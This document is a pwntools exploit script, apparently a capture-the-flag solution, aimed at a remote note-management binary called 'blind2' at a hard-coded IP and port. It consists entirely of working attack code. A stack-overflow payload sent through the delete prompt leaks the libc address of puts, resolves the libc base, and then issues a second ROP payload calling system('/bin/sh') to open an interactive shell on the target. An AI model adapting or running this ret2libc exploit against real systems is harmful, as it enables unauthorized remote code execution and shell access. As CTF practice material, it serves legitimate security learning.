from pwn import *
from LibcSearcher import LibcSearcher

p = remote("118.89.111.179",12333)
elf = ELF("./blind2")
libc = ELF("/home/pwn/libc/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so")

def add(index,note):
     p.sendlineafter(">","1")
     p.sendlineafter(":",str(index))
     p.sendafter(":",note)
def edit(index,note):
     p.sendlineafter(">","3")
     p.sendlineafter(":",str(index))
     p.sendafter(":",note)
def delete(index,s="n\n"):
     p.sendlineafter(">","2")
     p.sendlineafter("confirm?",s)
     p.sendlineafter(":",str(index))

add(0 , "stack overflow\n")
delete(11 , "a" * 0xd + "b" * 4 + p32(elf.plt["puts"]) + p32(elf.sym["main"]) + p32(elf.got["puts"]))
p.recvuntil("invalid range\n")
## get libc mode
# puts_addr = u32(p.recv(4))
# libc = LibcSearcher("puts" , puts_addr)
# libc_base = puts_addr - libc.dump("puts")
## get shell mode
libc.address = u32(p.recv(4)) - libc.sym["puts"]
delete(11 , "a" * 0xd + "b" * 4 + p32(libc.sym["system"]) + p32(elf.sym["main"]) + p32(libc.search("/bin/sh").next()))
p.recvuntil("invalid range\n")
p.interactive()